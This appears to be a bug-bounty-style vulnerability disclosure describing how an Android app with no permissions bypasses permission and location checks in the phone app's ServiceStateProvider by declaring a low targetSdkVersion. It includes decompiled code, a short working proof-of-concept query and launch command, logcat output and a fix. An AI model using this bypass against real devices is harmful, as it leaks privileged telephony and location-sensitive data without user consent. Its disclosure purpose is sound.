# com.android.phone — `ServiceStateProvider` Location/Privileged-Telephony-State Permission Check Bypassed via `targetSdkVersion` Downgrade

## Summary

`com.android.phone.ServiceStateProvider` (authority `content://service-state`) is a system content provider (`uid=android.uid.phone`) with **no `readPermission`** in its manifest (only `writePermission="android.permission.MODIFY_PHONE_STATE"`). All authorization for reads is enforced entirely in code, inside `query()`. That code enforces two separate protections — a `READ_PRIVILEGED_PHONE_STATE` check gating detailed radio/network fields, and a runtime location-permission check (`hasLocationPermission()`) gating two explicitly location-sensitive fields (`network_id`, `system_id`) — but **both checks are wrapped in a single `if` condition that only activates when the calling app's own `targetSdkVersion >= 31`**. A zero-permission app that simply declares `android:targetSdkVersion` below 31 in its own manifest skips both checks entirely and receives the full, unredacted 26-column result set with **zero permissions of any kind**.

## Severity: MEDIUM

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Confidentiality — a zero-permission app can read `READ_PRIVILEGED_PHONE_STATE`-gated telephony state (radio technology, carrier/operator names, carrier-aggregation status, emergency-only status) and the two fields (`network_id`, `system_id` — CDMA network/base-station identifiers) that Android's own telephony team explicitly classified as location-sensitive and gated behind `ACCESS_FINE_LOCATION`/`ACCESS_COARSE_LOCATION`, by trivially declaring a low `targetSdkVersion`.

## Affected Component

- **Package**: `com.android.phone` (`sharedUserId="android.uid.phone"`), versionCode 37
- **Provider**: `com.android.phone.ServiceStateProvider`, authority `service-state`

```
provider android:name="com.android.phone.ServiceStateProvider"
  android:exported=true
  android:writePermission="android.permission.MODIFY_PHONE_STATE"
  (no readPermission)
```

## Root Cause

`ServiceStateProvider.query()` (`com/android/phone/ServiceStateProvider.java`):

```java
static final long ENFORCE_LOCATION_PERMISSION_CHECK = 191911306; // CompatChanges id
static final String[] ALL_COLUMNS = { /* 26 columns, incl. network_id, system_id, voice/data
    operator alpha names, radio technology, carrier-aggregation flag, emergency-only flag */ };
static final String[] PUBLIC_COLUMNS = { "voice_reg_state", "data_reg_state",
    "voice_operator_numeric", "is_manual_network_selection", "data_network_type", "duplex_mode" };
private static final Set LOCATION_PROTECTED_COLUMNS_SET = Set.of("network_id", "system_id");

public Cursor query(...) {
    ...
    boolean zIsChangeEnabled = CompatChanges.isChangeEnabled(ENFORCE_LOCATION_PERMISSION_CHECK);
    boolean z2 = TelephonyPermissions.getTargetSdk(getContext(), getCallingPackage()) >= 31;
    boolean z3 = getContext().checkCallingOrSelfPermission(
        "android.permission.READ_PRIVILEGED_PHONE_STATE") == 0;

    if (zIsChangeEnabled && z2 && !z3) {
        strArr3 = PUBLIC_COLUMNS;                 // restricted: only reached if caller targetSdk >= 31
    } else {
        String[] strArr4 = ALL_COLUMNS;
        if (zIsChangeEnabled) {                   // location redaction ALSO gated on the same flag
            ... if (!hasLocationPermission()) { serviceState = getLocationRedactedServiceState(serviceState); }
        }
        strArr3 = strArr4;                        // UNRESTRICTED: reached whenever targetSdk < 31
    }
    ...
}
```

Because `CompatChanges.isChangeEnabled(ENFORCE_LOCATION_PERMISSION_CHECK)` is Android's standard "gated behavior change" mechanism — enabled by default only for apps whose declared `targetSdkVersion` is at or above the API level the change shipped in, and **grandfathered off for apps below that level** — an app can unconditionally disable both the `READ_PRIVILEGED_PHONE_STATE` gate and the location-permission gate simply by declaring a low `targetSdkVersion`, independent of `minSdkVersion` (which can remain anything) and independent of any permission the app actually holds or declares. `TelephonyPermissions.getTargetSdk()` reads this value straight from the calling app's own `PackageManager` `ApplicationInfo`, which is entirely attacker-controlled.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

A minimal, standalone, **zero-permission** APK (`com.vrp.lowsdk`) declaring:

```xml
<uses-sdk android:minSdkVersion="28" android:targetSdkVersion="28" />
```

and no `<uses-permission>` entries at all, queries the provider with an explicit URI and no projection (requesting all columns):

```java
Uri uri = Uri.parse("content://service-state");
Cursor c = getContentResolver().query(uri, null, null, null, null);
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions, `targetSdkVersion=28`.
2. Launch it:
   ```
   adb shell am start -n com.vrp.lowsdk/.ServiceStateLeakActivity
   ```

### Runtime Proof (logcat)

```
W SERVICESTATE_LEAK: targetSdkVersion=28
W SERVICESTATE_LEAK: UID=10398 (ZERO permissions, low targetSdk)
W SERVICESTATE_LEAK: columnCount=26
W SERVICESTATE_LEAK: columns=[voice_reg_state, data_reg_state, voice_roaming_type, data_roaming_type,
  voice_operator_alpha_long, voice_operator_alpha_short, voice_operator_numeric, data_operator_alpha_long,
  data_operator_alpha_short, data_operator_numeric, is_manual_network_selection, ril_voice_radio_technology,
  ril_data_radio_technology, css_indicator, network_id, system_id, cdma_roaming_indicator,
  cdma_default_roaming_indicator, cdma_eri_icon_index, cdma_eri_icon_mode, is_emergency_only,
  is_using_carrier_aggregation, operator_alpha_long_raw, operator_alpha_short_raw, data_network_type, duplex_mode]
W SERVICESTATE_LEAK: ROW: voice_reg_state=1 | data_reg_state=1 | ... | ril_voice_radio_technology=16 |
  ril_data_radio_technology=18 | ... | network_id=-1 | system_id=-1 | ... | is_emergency_only=1 |
  is_using_carrier_aggregation=0 | ...
```

**All 26 `ALL_COLUMNS`** are returned — confirming both the `READ_PRIVILEGED_PHONE_STATE` gate and the location-permission gate were skipped entirely, purely because of the declared `targetSdkVersion=28`. (Re-running the identical query from an app with `targetSdkVersion=34` and no permissions returns only the 6 `PUBLIC_COLUMNS`, confirming the gate is live and that `targetSdkVersion` alone is the differentiator.)

Note on this specific test run: `network_id` and `system_id` show sentinel value `-1` because this device/carrier is not currently CDMA-registered (no CDMA network/base-station identifiers exist to report). This does not weaken the finding — the code path that would have called `hasLocationPermission()` before deciding whether to redact these two fields was **not executed at all**, which is independently confirmed by the fact that the other 20 non-public, non-location fields (radio technology, operator alpha names, carrier-aggregation flag, emergency-only flag — all of which the code would have stripped down to `PUBLIC_COLUMNS` had the primary permission gate fired) were returned in full. On any CDMA-registered device or carrier, `network_id`/`system_id` would be populated with the real cell/base-station identifiers and returned identically unredacted to this same zero-permission, zero-location-permission caller.

## Impact

### Confidentiality
- A zero-permission app can read fields Android's own telephony/location teams explicitly designated as requiring `READ_PRIVILEGED_PHONE_STATE` or location permissions (`network_id`, `system_id`) — a full permission bypass requiring nothing more than a low `targetSdkVersion` declaration, no user interaction, no consent dialog, and no trace in Android's permission-usage UI (since no permission is invoked at all).
- Google Play's minimum target-SDK policy does not prevent this: it only blocks new *submissions*, not sideloaded APKs, already-published low-targetSdk apps, or the technique itself as a general architecture flaw independent of any specific app.
- This is a textbook instance of a broader anti-pattern (gating a security-relevant permission check behind a `CompatChanges`/target-SDK condition with no hard floor) that is worth auditing for across other telephony/system providers using the same `ENFORCE_LOCATION_PERMISSION_CHECK`-style pattern.

## Recommended Fix

Decouple the authorization checks from `CompatChanges.isChangeEnabled()`/target-SDK entirely — enforce `READ_PRIVILEGED_PHONE_STATE` and the location-permission redaction unconditionally for every caller regardless of the caller's declared `targetSdkVersion`. If backward compatibility for legitimately grandfathered privileged callers is required, gate on an explicit signature/system permission or allowlist rather than an attacker-controlled manifest field.

## Files Attached

- `poc.apk` — Zero-permission, `targetSdkVersion=28` PoC app
- `ServiceStateLeakActivity.java` — PoC source
- `logcat_proof.txt` — Runtime proof log
